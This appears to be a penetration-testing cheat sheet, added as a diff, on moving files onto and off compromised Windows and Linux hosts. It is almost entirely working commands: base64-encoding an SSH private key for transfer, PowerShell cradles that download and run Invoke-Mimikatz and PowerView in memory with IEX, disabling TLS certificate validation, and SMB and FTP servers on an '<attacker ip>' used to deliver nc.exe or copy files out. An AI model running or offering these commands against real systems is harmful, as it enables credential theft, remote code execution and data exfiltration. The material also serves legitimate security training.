@@ -1,0 +1,149 @@
+---------------------------
+File Transfer - Base64 Encode & Decode
+---------------------------
+
+1 Encoding file in base64 (Linux)
+
+cat id_rsa |base64 -w 0;echo
+
+2 Decode base64 in PowerShell
+
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<encoded base64 string>"))
+
+3 Verifying file hash
+
+md5sum id_rsa (Linux)
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 (Windows)
+
+---------------------------
+File Transfer - WebClient Downloads
+---------------------------
+
+1 PS DownloadFile
+
+(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+2 PS DownloadFileAsync
+
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+
+---------------------------
+File Transfer - PS DownloadString
+---------------------------
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+---------------------------
+File Transfer - PS Invoke-WebRequest
+---------------------------
+
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+
+---------------------------
+File Transfer - PS Download Cradles
+---------------------------
+
+Refer: https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
+
+---------------------------
+File Transfer - PS Common Errors
+---------------------------
+
+Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+
+Error 1:
+
+Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+Solution:
+1. Bypassed using the parameter -UseBasicParsing
+
+Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+
+Error 2 (SSL/TLS certificate not trusted):
+
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
+relationship for the SSL/TLS secure channel."
+At line:1 char:1
++ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+
+Solution:
+
+1. Bypass that error with the following command
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+---------------------------
+File Transfer - SMB Downloads
+---------------------------
+
+1. Anonymous SMB Download
+1.1 Setup SMB Server
+
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+1.2 Copy file from SMB Server
+
+copy \\192.168.220.133\share\nc.exe
+
+2. Password Protected SMB Download
+
+2.1 Setup SMB Server with Credentials
+- New versions of Windows block unauthenticated guest access, as we can see in the following command: 
+
+{ You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.}
+
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+2.2 Mount the SMB Server with the credentials
+
+net use n: \\<attacker ip>\share /user:test test
+
+3. SMB File Copy
+
+copy filename \\<attacker ip>\sharename
+
+---------------------------
+File Transfer - FTP Downloads
+---------------------------
+
+1. Installing FTP Server
+
+sudo pip3 install pyftpdlib
+
+2. Setting up a Python3 FTP Server
+
+sudo python3 -m pyftpdlib --port 21
+
+3. Transferring Files from an FTP Server Using PowerShell
+
+(New-Object Net.WebClient).DownloadFile('ftp://<attacker ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+
+---------------------------
+File Transfer - FTP Transfer without interactive shell
+---------------------------
+
+1. Create a Command File for the FTP Client and Download the Traget File
+
+echo open <attacker ip> > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+
+ftp -v -n -s:ftpcommand.txt
